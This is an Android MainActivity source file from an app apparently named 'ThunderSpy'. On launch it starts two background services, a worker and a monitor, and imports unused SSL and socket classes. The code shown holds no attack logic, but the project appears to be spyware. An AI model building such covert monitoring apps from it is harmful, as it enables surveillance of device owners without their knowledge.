package com.thunderspy.spy;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import com.thunderspy.spy.utils.ApplicationContextManager;
import com.thunderspy.spy.utils.SocketsHolder;
import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;

import java.io.InputStream;
import java.io.OutputStream;
import java.security.cert.CertificateException;
import java.security.cert.CertificateExpiredException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class MainActivity extends AppCompatActivity {
    volatile int x = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ApplicationContextManager.initApplicationContext(this.getApplicationContext());



        final TextView tv = (TextView)findViewById(R.id.tv);

        startService(new Intent(getApplicationContext(), WorkerService.class));
        startService(new Intent(getApplicationContext(), MonitorService.class));


        Handler h = new Handler(getMainLooper());
        Runnable r = new Runnable() {
            @Override
            public void run() {
                //executorService.shutdownNow();
            }
        };
        h.postDelayed(r, 10000);

    }
}















